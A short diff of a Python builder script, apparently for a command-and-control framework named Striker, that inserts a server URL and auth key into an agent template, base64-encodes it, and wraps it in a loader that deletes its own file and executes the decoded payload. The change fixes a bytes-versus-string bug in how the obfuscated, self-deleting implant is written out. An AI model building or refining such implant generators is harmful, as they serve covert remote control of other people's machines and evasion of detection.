@@ -30,8 +30,8 @@ def main(url, authKey, delay, stub, outfile):
   payload = payload.replace("[STRIKER_AUTH_KEY]", authKey)
   payload = payload.replace("[STRIKER_DELAY]", str(delay))
   payload = b64encode(payload.encode())
-  payload = f"import os, sys, base64; os.remove(sys.argv[0]); exec(base64.b64decode({payload}))"
-  wfo = open(outfile, "w")
+  payload = b"import os, sys, base64; os.remove(sys.argv[0]); exec(base64.b64decode(\"" + payload + b"\"))"
+  wfo = open(outfile, "wb")
   wfo.write(payload)
   wfo.close()
   print("[+] Agent built successfully: " + outfile)
